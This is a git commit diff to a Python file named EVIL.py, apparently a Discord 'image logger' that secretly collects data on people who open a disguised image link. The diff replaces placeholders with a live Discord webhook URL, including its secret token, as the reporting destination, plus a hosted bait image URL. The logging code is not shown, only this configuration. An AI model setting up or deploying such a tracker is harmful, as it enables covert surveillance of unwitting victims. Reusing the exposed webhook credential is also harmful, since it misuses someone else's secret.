b36f4e29f6935393816731f53a423be4949a32fc
Alsayiden <137013397+Alsayiden@users.noreply.github.com>
2025-01-31 21:30:51 -0400

    Update EVIL.py

--- Evil but not evil/EVIL.py
+++ Evil but not evil/EVIL.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335058412009947196/xTebhPIacJj7FSqL9KLaPNYyx41gCUp7jYo1xbWhgtH04FJrlyeNblEGA2mILWZC1UrT",
+    "image": "https://cdn.discordapp.com/attachments/1332156836387749932/1335059450641252372/attachment.png?ex=679eca81&is=679d7901&hm=13598e67b8cc509f75cebcf241175b9da092f92b0331e1fa8b678a706cdb3168&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
